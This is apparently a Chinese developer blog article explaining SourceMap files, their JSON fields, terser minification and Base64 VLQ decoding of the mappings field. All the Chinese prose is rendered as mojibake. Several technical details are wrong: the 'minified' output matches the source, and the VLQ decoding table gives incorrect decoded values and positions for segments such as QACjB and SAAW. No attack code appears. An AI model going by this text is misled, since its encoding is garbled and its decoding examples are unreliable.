.hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">SourceMap æ·±åº¦è§£æï¼šä»æ˜ å°„åŸç†åˆ°çº¿ä¸Šç›‘æ§è½åœ°</h2>
<p>åœ¨å‰ç«¯å·¥ç¨‹åŒ–ä½“ç³»ä¸­ï¼ŒSourceMap æ˜¯è§£å†³ã€Œå‹ç¼©ä»£ç è°ƒè¯•éš¾ã€çš„æ ¸å¿ƒå·¥å…·ï¼Œä½†å¤šæ•°å¼€å‘è€…ä»…åœç•™åœ¨"çŸ¥é“èƒ½ç”¨"çš„å±‚é¢ï¼Œæ—¢ä¸æ¸…æ¥šå…¶åº•å±‚çš„ mappings å­—æ®µç¼–ç é€»è¾‘ï¼Œä¹Ÿä¸äº†è§£ç”Ÿäº§ç¯å¢ƒå¦‚ä½•å®‰å…¨è½åœ°ã€‚æœ¬æ–‡å°†ä» SourceMap çš„æœ¬è´¨å‡ºå‘ï¼Œæ‹†è§£ mappings å­—æ®µçš„ Base64 VLQ æ˜ å°„é€»è¾‘ï¼Œå¹¶ç»“åˆçº¿ä¸Šç›‘æ§åœºæ™¯ï¼Œè®²é€ SourceMap çš„å®æˆ˜ç”¨æ³•ã€‚</p>
<h3 data-id="heading-1">ğŸ“‘ ç›®å½•</h3>
<ul>
<li><a href="#%E4%B8%80sourcemap-%E6%98%AF%E4%BB%80%E4%B9%88%E8%A7%A3%E5%86%B3%E4%BB%80%E4%B9%88%E9%97%AE%E9%A2%98" title="#%E4%B8%80sourcemap-%E6%98%AF%E4%BB%80%E4%B9%88%E8%A7%A3%E5%86%B3%E4%BB%80%E4%B9%88%E9%97%AE%E9%A2%98">ä¸€ã€SourceMap æ˜¯ä»€ä¹ˆï¼Ÿè§£å†³ä»€ä¹ˆé—®é¢˜ï¼Ÿ</a>
<ul>
<li><a href="#sourcemap%E7%94%B1%E6%9D%A5" title="#sourcemap%E7%94%B1%E6%9D%A5">SourceMap ç”±æ¥</a></li>
<li><a href="#11-%E6%A0%B8%E5%BF%83%E7%97%9B%E7%82%B9%E5%8E%8B%E7%BC%A9%E4%BB%A3%E7%A0%81%E8%B0%83%E8%AF%95%E7%9A%84%E5%99%A9%E6%A2%A6" title="#11-%E6%A0%B8%E5%BF%83%E7%97%9B%E7%82%B9%E5%8E%8B%E7%BC%A9%E4%BB%A3%E7%A0%81%E8%B0%83%E8%AF%95%E7%9A%84%E5%99%A9%E6%A2%A6">æ ¸å¿ƒç—›ç‚¹ï¼šå‹ç¼©ä»£ç è°ƒè¯•çš„"å™©æ¢¦"</a></li>
<li><a href="#12-sourcemap-%E6%9C%AC%E8%B4%A8%E4%BB%A3%E7%A0%81%E7%9A%84%E5%9D%90%E6%A0%87%E6%98%A0%E5%B0%84%E8%A1%A8" title="#12-sourcemap-%E6%9C%AC%E8%B4%A8%E4%BB%A3%E7%A0%81%E7%9A%84%E5%9D%90%E6%A0%87%E6%98%A0%E5%B0%84%E8%A1%A8">SourceMap æœ¬è´¨ï¼šä»£ç çš„"åæ ‡æ˜ å°„è¡¨"</a></li>
</ul>
</li>
<li><a href="#%E4%BA%8Csourcemap-%E6%A0%B8%E5%BF%83%E7%BB%93%E6%9E%84%E4%B8%8E-mappings-%E5%AD%97%E6%AE%B5%E8%A7%A3%E6%9E%90" title="#%E4%BA%8Csourcemap-%E6%A0%B8%E5%BF%83%E7%BB%93%E6%9E%84%E4%B8%8E-mappings-%E5%AD%97%E6%AE%B5%E8%A7%A3%E6%9E%90">äºŒã€SourceMap æ ¸å¿ƒç»“æ„ä¸ mappings å­—æ®µè§£æ</a>
<ul>
<li><a href="#21-sourcemap-%E6%A0%87%E5%87%86%E7%BB%93%E6%9E%84" title="#21-sourcemap-%E6%A0%87%E5%87%86%E7%BB%93%E6%9E%84">SourceMap æ ‡å‡†ç»“æ„</a></li>
<li><a href="#22-mappings-%E5%AD%97%E6%AE%B5base64-vlq-%E6%98%A0%E5%B0%84%E9%80%BB%E8%BE%91%E6%A0%B8%E5%BF%83" title="#22-mappings-%E5%AD%97%E6%AE%B5base64-vlq-%E6%98%A0%E5%B0%84%E9%80%BB%E8%BE%91%E6%A0%B8%E5%BF%83">mappings å­—æ®µï¼šBase64 VLQ æ˜ å°„é€»è¾‘ï¼ˆæ ¸å¿ƒï¼‰</a></li>
</ul>
</li>
<li><a href="#%E4%B8%89%E7%BA%BF%E4%B8%8A%E7%9B%91%E6%8E%A7sourcemap-%E5%AE%89%E5%85%A8%E8%90%BD%E5%9C%B0%E5%AE%9E%E8%B7%B5" title="#%E4%B8%89%E7%BA%BF%E4%B8%8A%E7%9B%91%E6%8E%A7sourcemap-%E5%AE%89%E5%85%A8%E8%90%BD%E5%9C%B0%E5%AE%9E%E8%B7%B5">ä¸‰ã€çº¿ä¸Šç›‘æ§ï¼šSourceMap å®‰å…¨è½åœ°å®è·µ</a>
<ul>
<li><a href="#31-%E6%A0%B8%E5%BF%83%E5%8E%9F%E5%88%99" title="#31-%E6%A0%B8%E5%BF%83%E5%8E%9F%E5%88%99">æ ¸å¿ƒåŸåˆ™</a></li>
<li><a href="#32-%E7%BB%93%E5%90%88-sentry-%E5%AE%9E%E7%8E%B0%E7%BA%BF%E4%B8%8A%E6%8A%A5%E9%94%99%E8%A7%A3%E6%9E%90%E4%B8%BB%E6%B5%81%E6%96%B9%E6%A1%88" title="#32-%E7%BB%93%E5%90%88-sentry-%E5%AE%9E%E7%8E%B0%E7%BA%BF%E4%B8%8A%E6%8A%A5%E9%94%99%E8%A7%A3%E6%9E%90%E4%B8%BB%E6%B5%81%E6%96%B9%E6%A1%88">ç»“åˆ Sentry å®ç°çº¿ä¸ŠæŠ¥é”™è§£æï¼ˆä¸»æµæ–¹æ¡ˆï¼‰</a></li>
<li><a href="#33-%E6%89%8B%E5%8A%A8%E7%A6%BB%E7%BA%BF%E8%A7%A3%E6%9E%90%E8%87%AA%E5%AE%9A%E4%B9%89%E7%9B%91%E6%8E%A7%E5%B9%B3%E5%8F%B0" title="#33-%E6%89%8B%E5%8A%A8%E7%A6%BB%E7%BA%BF%E8%A7%A3%E6%9E%90%E8%87%AA%E5%AE%9A%E4%B9%89%E7%9B%91%E6%8E%A7%E5%B9%B3%E5%8F%B0">æ‰‹åŠ¨ç¦»çº¿è§£æï¼ˆè‡ªå®šä¹‰ç›‘æ§å¹³å°ï¼‰</a></li>
</ul>
</li>
<li><a href="#%E5%9B%9Bsourcemap-%E5%B8%B8%E8%A7%81%E9%85%8D%E7%BD%AE%E4%B8%8E%E9%81%BF%E5%9D%91" title="#%E5%9B%9Bsourcemap-%E5%B8%B8%E8%A7%81%E9%85%8D%E7%BD%AE%E4%B8%8E%E9%81%BF%E5%9D%91">å››ã€SourceMap å¸¸è§é…ç½®ä¸é¿å‘</a></li>
<li><a href="#%E4%BA%94%E6%80%BB%E7%BB%93" title="#%E4%BA%94%E6%80%BB%E7%BB%93">äº”ã€æ€»ç»“</a></li>
</ul>
<h3 data-id="heading-2">ä¸€ã€SourceMap æ˜¯ä»€ä¹ˆï¼Ÿè§£å†³ä»€ä¹ˆé—®é¢˜ï¼Ÿ</h3>
<h4 data-id="heading-3">SourceMapç”±æ¥</h4>
<p>SourceMap æœ€æ—©ç”± Google å·¥ç¨‹å¸ˆåœ¨å¼€å‘ Closure Compilerï¼ˆ<a href="https://link.juejin.cn?target=https%3A%2F%2Fdevelopers.google.com%2Fclosure%2Fcompiler%2Fdocs%2Fgettingstarted_app%3Fhl%3Dzh-cn" target="_blank" title="https://developers.google.com/closure/compiler/docs/gettingstarted_app?hl=zh-cn" ref="nofollow noopener noreferrer">è°·æ­Œé—­åŒ…ç¼–è¯‘å™¨</a>ï¼‰æ—¶æå‡ºï¼Œåˆè¡·æ˜¯è§£å†³ã€Œç¼–è¯‘åçš„ä»£ç è°ƒè¯•éš¾ã€é—®é¢˜ â€”â€” æ—©æœŸå‰ç«¯ä»£ç å‹ç¼© / ç¼–è¯‘åï¼Œè°ƒè¯•åªèƒ½çœ‹åˆ°æ··æ·†åçš„ä»£ç ï¼Œå·¥ç¨‹å¸ˆéœ€è¦ä¸€ä¸ªå·¥å…·èƒ½ â€œåå‘æ‰¾åˆ°æºç ä½ç½®â€ï¼Œå› æ­¤å°†è¿™ä¸ªã€Œå­˜å‚¨æºç æ˜ å°„å…³ç³»çš„æ–‡ä»¶ã€å‘½åä¸º SourceMapã€‚åç»­è¯¥è§„èŒƒè¢«æ ‡å‡†åŒ–ï¼ˆå½“å‰ä¸»æµä¸º Version 3 ç‰ˆæœ¬ï¼‰ï¼Œå¹¶è¢« Webpackã€Viteã€Babelã€Terser ç­‰å‡ ä¹æ‰€æœ‰å‰ç«¯æ„å»ºå·¥å…·é‡‡çº³ï¼ŒSourceMap ä¹Ÿæˆä¸ºè¡Œä¸šé€šç”¨æœ¯è¯­ã€‚</p>
<p>SourceMap ç”± Source + Map ä¸¤ä¸ªè‹±æ–‡å•è¯ç»„åˆè€Œæˆï¼Œå…¶å‘½åç²¾å‡†å¯¹åº”å·¥å…·çš„æ ¸å¿ƒåŠŸèƒ½ï¼š</p>
<ul>
<li>Sourceï¼šæŒ‡ã€ŒåŸå§‹æºç ï¼ˆSource Codeï¼‰ã€â€”â€” å³å¼€å‘è€…ç¼–å†™çš„æœªç¼–è¯‘ã€æœªå‹ç¼©çš„ä»£ç ï¼ˆå¦‚ ES6/TS ä»£ç ã€React/Vue æºç ï¼‰ï¼›</li>
<li>Mapï¼šæŒ‡ã€Œæ˜ å°„ï¼ˆMappingï¼‰ã€â€”â€” åœ¨è®¡ç®—æœºé¢†åŸŸï¼Œâ€œMapâ€ æ ¸å¿ƒå«ä¹‰æ˜¯ã€Œé”®å€¼å¯¹çš„å¯¹åº”å…³ç³»ã€ï¼ˆå¦‚å“ˆå¸Œè¡¨ã€æ˜ å°„è¡¨ï¼‰ï¼Œæ­¤å¤„ç‰¹æŒ‡ã€Œå‹ç¼© / ç¼–è¯‘åçš„ä»£ç ã€ä¸ã€ŒåŸå§‹æºç ã€ä¹‹é—´çš„åæ ‡ã€åç§°æ˜ å°„å…³ç³»ã€‚</li>
</ul>
<h4 data-id="heading-4">1.1 æ ¸å¿ƒç—›ç‚¹ï¼šå‹ç¼©ä»£ç è°ƒè¯•çš„"å™©æ¢¦"</h4>
<p>å‰ç«¯é¡¹ç›®ä¸Šçº¿å‰ï¼Œä»£ç ä¼šç»è¿‡ <strong>ç¼–è¯‘ï¼ˆBabel è½¬ ES5ï¼‰ã€æ··æ·†ï¼ˆå˜é‡åç¼©çŸ­ï¼‰ã€å‹ç¼©ï¼ˆåˆå¹¶è¡Œ/åˆ ç©ºæ ¼ï¼‰</strong> å¤„ç†ï¼š</p>
<ul>
<li>
<p>æºç ï¼š<code>function sayHi(userName) { return </code>Hi ${userName}<code>; }</code></p>
</li>
<li>
<p>å‹ç¼©åï¼š<code>function a(b){return</code>Hi ${b}<code>}</code></p>
</li>
</ul>
<p>æ­¤æ—¶è‹¥ä»£ç æŠ¥é”™ï¼Œæµè§ˆå™¨æ§åˆ¶å°åªä¼šæ˜¾ç¤ºã€Œz-index.min.js:1:25ã€è¿™ç±»å‹ç¼©ä»£ç çš„åæ ‡ï¼Œå®Œå…¨æ— æ³•å®šä½åˆ°æºç çš„å…·ä½“ä½ç½®â€”â€”è¿™å°±æ˜¯ SourceMap è¦è§£å†³çš„æ ¸å¿ƒé—®é¢˜ã€‚</p>
<h4 data-id="heading-5">1.2 SourceMap æœ¬è´¨ï¼šä»£ç çš„"åæ ‡æ˜ å°„è¡¨"</h4>
<p>SourceMap æ˜¯ä¸€ä¸ªä»¥ <code>.map</code> ä¸ºåç¼€çš„ JSON æ–‡ä»¶ï¼Œæ ¸å¿ƒä½œç”¨æ˜¯å»ºç«‹ã€Œå‹ç¼©åä»£ç ã€ä¸ã€ŒåŸå§‹æºç ã€çš„ä¸€ä¸€æ˜ å°„å…³ç³»ï¼š</p>
<ul>
<li>
<p>å‹ç¼©åä»£ç çš„"è¡Œ/åˆ—" â†” æºç çš„"æ–‡ä»¶/è¡Œ/åˆ—"ï¼›</p>
</li>
<li>
<p>å‹ç¼©åçš„å˜é‡åï¼ˆå¦‚ <code>a</code>ï¼‰ â†” æºç çš„å˜é‡åï¼ˆå¦‚ <code>sayHi</code>ï¼‰ï¼›</p>
</li>
<li>
<p>ç®€å•ç±»æ¯”ï¼šæºç æ˜¯"åŸç‰ˆä¹¦"ï¼Œå‹ç¼©ä»£ç æ˜¯"ç²¾ç®€è¯‘æœ¬"ï¼ŒSourceMap æ˜¯"å¯¹ç…§å­—å…¸"ã€‚</p>
</li>
</ul>
<h3 data-id="heading-6">äºŒã€SourceMap æ ¸å¿ƒç»“æ„ä¸ mappings å­—æ®µè§£æ</h3>
<h4 data-id="heading-7">2.1 SourceMap æ ‡å‡†ç»“æ„</h4>
<p>SourceMapæœ¬è´¨å°±æ˜¯ä¸€ä¸ªjsonæ–‡ä»¶ï¼Œä¸€ä¸ªå®Œæ•´çš„ SourceMap æ–‡ä»¶åŒ…å« 6 ä¸ªæ ¸å¿ƒå­—æ®µï¼Œä»¥æç®€ç¤ºä¾‹ä¸ºä¾‹ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"version"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">3</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// SourceMap ç‰ˆæœ¬ï¼ˆä¸»æµä¸º3ï¼‰</span>
  <span class="hljs-attr">"file"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"z-index.min.js"</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// å‹ç¼©åçš„äº§ç‰©æ–‡ä»¶å</span>
  <span class="hljs-attr">"sources"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"z-index.js"</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// åŸå§‹æºç æ–‡ä»¶è·¯å¾„åˆ—è¡¨ï¼Œå¯èƒ½æœ‰å¤šä¸ª</span>
  <span class="hljs-attr">"names"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"userName"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"sayHi"</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// æºç ä¸­çš„å˜é‡/å‡½æ•°ååˆ—è¡¨</span>
  <span class="hljs-attr">"mappings"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"AAAA,MAAMA,SAAW,QACjB,SAASC,QACP,MAAO,MAAMD,UACf"</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// æ ¸å¿ƒæ˜ å°„è§„åˆ™ï¼ˆBase64 VLQ ç¼–ç ï¼‰</span>
  <span class="hljs-attr">"sourcesContent"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
    <span class="hljs-comment">// å¯é€‰ï¼šå­˜å‚¨æºç æ–‡æœ¬ï¼Œè§£ææ—¶æ— éœ€é¢å¤–è¯»å–æºç </span>
    <span class="hljs-string">"const userName = 'Alice';\nfunction sayHi() {\n  return `Hi ${userName}`;\n}\n"</span>
  <span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>å„å­—æ®µæ ¸å¿ƒä½œç”¨ï¼š</p>

































<table><thead><tr><th>å­—æ®µ</th><th>æ ¸å¿ƒä½œç”¨</th></tr></thead><tbody><tr><td><code>version</code></td><td>å›ºå®šç‰ˆæœ¬å·ï¼Œç¡®ä¿è§£æå™¨å…¼å®¹</td></tr><tr><td><code>file</code></td><td>å…³è”çš„å‹ç¼©äº§ç‰©æ–‡ä»¶å</td></tr><tr><td><code>sources</code></td><td>æ˜ å°„çš„åŸå§‹æºç è·¯å¾„ï¼Œæ”¯æŒå¤šä¸ªæ–‡ä»¶ï¼ˆå¦‚å¤šå…¥å£é¡¹ç›®ï¼‰</td></tr><tr><td><code>names</code></td><td>æºç ä¸­çš„å˜é‡/å‡½æ•°åï¼Œå‹ç¼©ååç§°é€šè¿‡æ­¤æ˜ å°„å›åŸå</td></tr><tr><td><code>mappings</code></td><td>æœ€æ ¸å¿ƒï¼šå­˜å‚¨"å‹ç¼©ä»£ç åæ ‡ â†” æºç åæ ‡"çš„æ˜ å°„è§„åˆ™ï¼ˆBase64 VLQ ç¼–ç ï¼‰</td></tr><tr><td><code>sourcesContent</code></td><td>å¯é€‰ï¼šå­˜å‚¨æºç æ–‡æœ¬ï¼Œè§£ææ—¶æ— éœ€é¢å¤–è¯»å–æºç æ–‡ä»¶</td></tr></tbody></table>
<h4 data-id="heading-8">2.2 mappings å­—æ®µï¼šBase64 VLQ æ˜ å°„é€»è¾‘ï¼ˆæ ¸å¿ƒï¼‰</h4>
<p><code>mappings</code> æ˜¯ SourceMap çš„çµé­‚ï¼Œå…¶æœ¬è´¨æ˜¯å°†ã€Œå‹ç¼©ä»£ç  â†” æºç ã€çš„åæ ‡æ˜ å°„å…³ç³»ï¼Œè½¬æ¢æˆä¸€ç»„æ•°å­—ï¼Œå†é€šè¿‡ VLQ ç¼–ç å‹ç¼©é•¿åº¦ï¼Œæœ€ç»ˆè½¬æˆ Base64 å­—ç¬¦ã€‚æˆ‘ä»¬ä»¥å®é™…çš„ <code>z-index.js</code> å‹ç¼©åœºæ™¯æ‹†è§£å…¨ç¨‹ï¼š</p>
<h5 data-id="heading-9">åœºæ™¯å‡†å¤‡</h5>
<p><strong>å‰ç½®å‡†å¤‡</strong>ï¼šå…¨å±€å®‰è£… terserï¼ˆ<code>pnpm install terser -g</code>ï¼‰</p>
<ul>
<li>
<p><strong>æºç </strong>ï¼ˆz-index.jsï¼‰ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> userName = <span class="hljs-string">'Alice'</span>;
<span class="hljs-keyword">function</span> <span class="hljs-title function_">sayHi</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> <span class="hljs-string">`Hi <span class="hljs-subst">${userName}</span>`</span>;
}
</code></pre>
</li>
<li>
<p><strong>ä½¿ç”¨ terser å‹ç¼©</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">terser z-index.js -o z-index.min.js --source-map <span class="hljs-string">"url='z-index.min.js.map',includeSources=true,filename='z-index.min.js'"</span>
</code></pre>
<p>ç”Ÿæˆä¸¤ä¸ªæ–‡ä»¶ï¼š<code>z-index.min.js</code> å’Œ <code>z-index.min.js.map</code></p>
</li>
<li>
<p><strong>å‹ç¼©åçš„ä»£ç </strong>ï¼ˆz-index.min.jsï¼‰ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> userName = <span class="hljs-string">'Alice'</span>;
<span class="hljs-keyword">function</span> <span class="hljs-title function_">sayHi</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> <span class="hljs-string">`Hi <span class="hljs-subst">${userName}</span>`</span>;
}
<span class="hljs-comment">//# sourceMappingURL=z-index.min.js.map</span>
</code></pre>
</li>
</ul>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"version"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">3</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"file"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"z-index.min.js"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"names"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"userName"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"sayHi"</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"sources"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"z-index.js"</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"sourcesContent"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
    <span class="hljs-string">"const userName = 'Alice';\nfunction sayHi() {\n  return `Hi ${userName}`;\n}\n"</span>
  <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"mappings"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"AAAA,MAAMA,SAAW,QACjB,SAASC,QACP,MAAO,MAAMD,UACf"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"ignoreList"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>































































































<table><thead><tr><th>æ˜ å°„æ®µ</th><th>Base64 VLQ</th><th>è§£ç åï¼ˆç›¸å¯¹åç§»ï¼‰</th><th>å‹ç¼©ä»£ç ä½ç½®</th><th>æºç ä½ç½®</th><th>å¯¹åº”å­—ç¬¦/å†…å®¹</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>AAAA</code></td><td>[0,0,0,0]</td><td>åˆ—:0, æ–‡ä»¶:0, è¡Œ:0, åˆ—:0</td><td>ç¬¬1è¡Œ, ç¬¬0åˆ—</td><td>z-index.js ç¬¬1è¡Œ, ç¬¬0åˆ—</td><td><code>c</code> (const)</td><td>èµ·å§‹ä½ç½®</td></tr><tr><td><code>MAAMA</code></td><td>[6,0,0,6,0]</td><td>åˆ—:+6, æ–‡ä»¶:+0, è¡Œ:+0, åˆ—:+6, åç§°:+0</td><td>ç¬¬1è¡Œ, ç¬¬6åˆ—</td><td>z-index.js ç¬¬1è¡Œ, ç¬¬6åˆ—</td><td><code>u</code> (userName)</td><td>userName å˜é‡åå¼€å§‹</td></tr><tr><td><code>SAAW</code></td><td>[9,0,0,9]</td><td>åˆ—:+9, æ–‡ä»¶:+0, è¡Œ:+0, åˆ—:+9</td><td>ç¬¬1è¡Œ, ç¬¬15åˆ—</td><td>z-index.js ç¬¬1è¡Œ, ç¬¬17åˆ—</td><td><code>A</code> (Alice)</td><td>'Alice' å­—ç¬¦ä¸²å¼€å§‹</td></tr><tr><td><code>QACjB</code></td><td>[1,0,1,3,1]</td><td>åˆ—:+1, æ–‡ä»¶:+0, è¡Œ:+1, åˆ—:+3, åç§°:+1</td><td>ç¬¬1è¡Œ, ç¬¬16åˆ—</td><td>z-index.js ç¬¬2è¡Œ, ç¬¬0åˆ—</td><td><code>f</code> (function)</td><td>function å…³é”®å­—</td></tr><tr><td><code>SAASC</code></td><td>[9,0,0,9,1]</td><td>åˆ—:+9, æ–‡ä»¶:+0, è¡Œ:+0, åˆ—:+9, åç§°:+1</td><td>ç¬¬1è¡Œ, ç¬¬25åˆ—</td><td>z-index.js ç¬¬2è¡Œ, ç¬¬9åˆ—</td><td><code>s</code> (sayHi)</td><td>sayHi å‡½æ•°å</td></tr><tr><td><code>QACP</code></td><td>[1,0,0,1]</td><td>åˆ—:+1, æ–‡ä»¶:+0, è¡Œ:+0, åˆ—:+1</td><td>ç¬¬1è¡Œ, ç¬¬26åˆ—</td><td>z-index.js ç¬¬2è¡Œ, ç¬¬15åˆ—</td><td><code>(</code></td><td>å‡½æ•°å‚æ•°æ‹¬å·</td></tr><tr><td><code>MAAO</code></td><td>[6,0,0,6]</td><td>åˆ—:+6, æ–‡ä»¶:+0, è¡Œ:+0, åˆ—:+6</td><td>ç¬¬1è¡Œ, ç¬¬32åˆ—</td><td>z-index.js ç¬¬2è¡Œ, ç¬¬16åˆ—</td><td><code>{</code></td><td>å‡½æ•°ä½“å¼€å§‹</td></tr><tr><td><code>MAAMD</code></td><td>[6,0,0,6,0]</td><td>åˆ—:+6, æ–‡ä»¶:+0, è¡Œ:+0, åˆ—:+6, åç§°:+0</td><td>ç¬¬1è¡Œ, ç¬¬38åˆ—</td><td>z-index.js ç¬¬3è¡Œ, ç¬¬2åˆ—</td><td><code>r</code> (return)</td><td>return å…³é”®å­—</td></tr><tr><td><code>UACf</code></td><td>[10,0,0,10]</td><td>åˆ—:+10, æ–‡ä»¶:+0, è¡Œ:+0, åˆ—:+10</td><td>ç¬¬1è¡Œ, ç¬¬48åˆ—</td><td>z-index.js ç¬¬3è¡Œ, ç¬¬9åˆ—</td><td><code>`</code></td><td>æ¨¡æ¿å­—ç¬¦ä¸²å¼€å§‹</td></tr></tbody></table>
<h5 data-id="heading-10">Step 1ï¼šå®šä¹‰æ˜ å°„æ•°å­—ç»„ï¼ˆ5ä¸ªæ ¸å¿ƒæ•°å­—ï¼‰</h5>
<p>SourceMap è§„å®šï¼Œæ¯ä¸€ç»„æ˜ å°„å…³ç³»ç”¨ <strong>5ä¸ªç›¸å¯¹åç§»æ•°å­—</strong> è¡¨ç¤ºï¼ˆå2ä¸ªå¯é€‰ï¼‰ï¼Œ"ç›¸å¯¹åç§»"æ˜¯æ ¸å¿ƒä¼˜åŒ–ï¼ˆé¿å…å­˜å‚¨å¤§æ•°ï¼‰ï¼š</p>
<p>ä»¥å®é™…çš„ <code>z-index.js</code> ä¸ºä¾‹ï¼Œæˆ‘ä»¬çœ‹å‡ ä¸ªå…³é”®æ˜ å°„æ®µï¼š</p>









































<table><thead><tr><th>æ•°å­—ä½ç½®</th><th>å«ä¹‰ï¼ˆç›¸å¯¹å‰ä¸€æ®µçš„åç§»é‡ï¼‰</th><th>MAAMAï¼ˆuserNameï¼‰</th><th>SAASCï¼ˆsayHiï¼‰</th></tr></thead><tbody><tr><td>ç¬¬1ä¸ª</td><td>å‹ç¼©ä»£ç çš„åˆ—å·åç§»</td><td>+6</td><td>+9</td></tr><tr><td>ç¬¬2ä¸ª</td><td>æºç åœ¨ sources æ•°ç»„çš„ç´¢å¼•</td><td>0</td><td>0</td></tr><tr><td>ç¬¬3ä¸ª</td><td>æºç è¡Œå·åç§»</td><td>0</td><td>0</td></tr><tr><td>ç¬¬4ä¸ª</td><td>æºç åˆ—å·åç§»</td><td>+6</td><td>+9</td></tr><tr><td>ç¬¬5ä¸ª</td><td>å˜é‡ååœ¨ names æ•°ç»„çš„ç´¢å¼•</td><td>0 (userName)</td><td>1 (sayHi)</td></tr></tbody></table>
<p><strong>è¯´æ˜</strong>ï¼š</p>
<ul>
<li><code>MAAMA</code> æ˜ å°„åˆ° <code>userName</code>ï¼šå‹ç¼©ä»£ç åˆ—å·+6ï¼Œæºç åˆ—å·+6ï¼Œåç§°ç´¢å¼•0 â†’ <code>names[0] = "userName"</code></li>
<li><code>SAASC</code> æ˜ å°„åˆ° <code>sayHi</code>ï¼šå‹ç¼©ä»£ç åˆ—å·+9ï¼Œæºç åˆ—å·+9ï¼Œåç§°ç´¢å¼•1 â†’ <code>names[1] = "sayHi"</code></li>
</ul>
<h5 data-id="heading-11">Step 2ï¼šVLQ ç¼–ç  + Base64 è½¬æ¢</h5>
<p>VLQ æ˜¯æŠŠ SourceMap é‡Œçš„ â€œç›¸å¯¹åç§»æ•°å­—â€ è½¬æˆ 6ä½â€œçŸ­äºŒè¿›åˆ¶â€ï¼ŒBase64 æ˜¯æŠŠ 6ä½â€œçŸ­äºŒè¿›åˆ¶â€ è½¬æˆ â€œå¯è¯»å­—ç¬¦â€ï¼Œä¸¤è€…é…åˆè®© mappings å­—æ®µæ—¢çŸ­åˆèƒ½è§£æã€‚</p>
<p>VLQ ç¼–ç çš„æ ¸å¿ƒä¼˜åŠ¿æ˜¯<strong>ç”¨æ›´å°‘çš„å­—ç¬¦è¡¨ç¤ºæ•°å­—</strong>ï¼Œç‰¹åˆ«æ˜¯å¯¹äºå°æ•°å­—ï¼ˆ0-63ï¼‰åªéœ€è¦1ä¸ªå­—ç¬¦ï¼Œ1 ä¸ªå­—ç¬¦é€šå¸¸å  8 ä½äºŒè¿›åˆ¶ï¼ˆ1 å­—èŠ‚ï¼‰ï¼ŒBase64 ç¼–ç æ—¶ï¼Œåªä½¿ç”¨è¿™ 8 ä½ä¸­çš„ä½ 6 ä½ï¼ˆé«˜ 2 ä½è¡¥ 0ï¼‰ï¼Œå› ä¸º 6 ä½äºŒè¿›åˆ¶åˆšå¥½èƒ½è¡¨ç¤º 0-63ï¼ŒåŒ¹é… Base64 çš„ 64 ä¸ªå­—ç¬¦ã€‚</p>

























